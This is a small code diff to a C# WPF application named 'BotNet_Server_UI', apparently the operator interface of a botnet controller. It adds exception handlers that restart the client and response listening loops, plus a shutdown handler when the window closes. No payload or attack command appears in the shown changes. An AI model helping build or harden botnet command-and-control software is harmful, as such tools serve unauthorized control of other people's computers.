@@ -122,6 +122,10 @@ namespace BotNet_Server_UI
                     Thread.Sleep(7000);
                 }
             }
+            catch (TaskCanceledException)
+            {
+                await Task.Run(() => ListenClients());
+            }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.ToString());
@@ -171,6 +175,10 @@ namespace BotNet_Server_UI
                     }
                     Thread.Sleep(1000);
                 }
+            }
+            catch (TaskCanceledException)
+            {
+                await Task.Run(() => ListenResponses());
             }
             catch (Exception ex)
             {
@@ -239,6 +247,11 @@ namespace BotNet_Server_UI
         {
             Screens screenwindow = new Screens();
             screenwindow.Show();
+        }
+
+        private void Main_Closed(object sender, EventArgs e)
+        {
+            Application.Current.Shutdown();
         }
     }
 }
